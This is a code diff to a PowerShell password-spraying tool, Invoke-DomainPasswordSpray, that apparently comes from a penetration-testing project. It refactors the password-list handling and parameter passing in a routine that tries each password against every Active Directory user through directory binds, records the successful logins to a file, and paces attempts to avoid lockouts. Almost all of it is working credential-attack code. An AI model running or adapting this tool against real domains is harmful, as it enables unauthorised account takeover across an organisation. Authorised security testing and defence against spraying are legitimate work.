@@ -89,6 +89,21 @@ function Invoke-DomainPasswordSpray{
      [switch]
      $Force
     )
+
+    if ($Password)
+    {
+        $Passwords = @($Password)
+    }
+    elseif($PasswordList)
+    {
+        $Passwords = Get-Content $PasswordList
+    }
+    else
+    {
+        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
+        break
+    }
+
     try
     {
         if ($Domain -ne "")
@@ -133,19 +148,6 @@ function Invoke-DomainPasswordSpray{
 
     }
 
-    if ($Password)
-    {
-        $Passwords = @($Password)
-    }
-    elseif($PasswordList)
-    {
-        $Passwords = Get-Content $PasswordList
-    }
-    else
-    {
-        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
-        break
-    }
 
     if ($Passwords.count > 1)
     {
@@ -179,12 +181,13 @@ function Invoke-DomainPasswordSpray{
             break
         }
     }
-    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with $(Passwords.count) passwords"
+    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $Passwords.count " passwords"
     Write-Host "[*] This might take a while depending on the total number of users"
+
 
     for($i = 0; $i -lt $Passwords.count; $i++)
     {
-        Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Passwords[$i], $OutFile)
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile
         if (($i+1) -lt $Passwords.count)
         {
             Countdown-Timer -Seconds (60*$observation_window)
@@ -435,17 +438,16 @@ function Invoke-SpraySinglePassword
 {
     param(
             [Parameter(Position=1)]
-            $CurrentDomain,
+            $Domain,
             [Parameter(Position=2)]
-            [string]
+            [string[]]
             $UserListArray,
-            [Parameter(Position=3)]
+            [Parameter(Position=3, Mandatory=$true)]
             [string]
             $Password,
             [Parameter(Position=4)]
             [string]
             $OutFile
-
     )
     $time = Get-Date
     $count = $UserListArray.count
@@ -455,7 +457,7 @@ function Invoke-SpraySinglePassword
 
     foreach ($User in $UserListArray)
     {
-        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
         if ($Domain_check.name -ne $null)
         {
             if ($OutFile -ne "")
@@ -467,11 +469,7 @@ function Invoke-SpraySinglePassword
         $curr_user += 1
         Write-Host -nonewline "$curr_user of $count users tested`r"
     }
-    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-    if ($OutFile -ne "")
-    {
-        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-    }
+
 }
 
 function Get-ObservationWindow()
@@ -486,4 +484,5 @@ function Get-ObservationWindow()
     [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
     return $observation_window
 }
+
 
